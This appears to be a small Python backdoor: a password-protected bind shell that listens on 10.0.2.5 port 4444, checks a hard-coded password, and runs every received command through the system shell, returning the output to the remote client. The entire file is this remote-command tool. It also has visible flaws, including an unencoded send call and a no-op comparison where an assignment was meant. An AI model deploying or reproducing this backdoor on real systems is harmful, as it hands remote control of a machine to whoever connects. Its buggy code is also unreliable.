import socket
import subprocess


def lookForConnection(server):
    print('Server Started')
    print('Listening For Client Connection')
    server.listen(1)
    client, client_addr = server.accept()
    client.send(("Input password for client: ").encode())
    password = client.recv(1024)
    password = password.decode()
    return password, client, client_addr

def checkPass(password, client, client_addr):
    valid = False
    if password == real_password:
        valid = True
        print(str(client_addr) + " has connected to the server")
        client.send(("Connected!"))
    else:
        valid = False
        client.send(("Incorrect Password...Closing Connection").encode())
        client.close()
        password, client, client_addr = lookForConnection(server)
        valid = checkPass(password, client, client_addr)
    return valid

HOST = '10.0.2.5'
PORT = 4444 
real_password = "helpme"
passwords_match = False
server = socket.socket()
server.bind((HOST, PORT))
password, client, client_addr = lookForConnection(server)
passwords_match = checkPass(password, client, client_addr)
print(passwords_match)

while passwords_match == True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    if command == "exit":
        passwords_match == False
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        client.send(("Disconnecting").encode())
        client.close()
        password, client, client_addr = lookForConnection(server)
        passwords_match = checkPass(password, client, client_addr)
        print(passwords_match)
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("[-] Sending response...")
        client.send(output + output_error)
